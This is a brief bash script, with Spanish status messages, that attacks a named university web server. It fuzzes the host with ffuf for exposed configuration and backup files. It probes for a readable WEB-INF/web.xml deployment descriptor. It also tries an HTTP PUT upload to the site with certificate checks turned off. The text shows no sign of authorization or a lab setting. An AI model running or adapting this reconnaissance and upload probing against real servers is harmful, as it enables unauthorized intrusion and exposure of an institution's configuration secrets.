#!/bin/bash
echo "[+] Escaneando archivos de configuración..."
ffuf -u "https://sito.utslp.edu.mx/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .xml,.properties,.bak -mc 200 -o scan_results.txt

echo "[+] Buscando WEB-INF..."
ffuf -u "https://sito.utslp.edu.mx/FUZZ/WEB-INF/web.xml" -w /usr/share/wordlists/dirb/common.txt -mc 200

echo "[+] Probando métodos HTTP..."
curl -X PUT -d "test" "https://sito.utslp.edu.mx/jsp/test.txt" -k
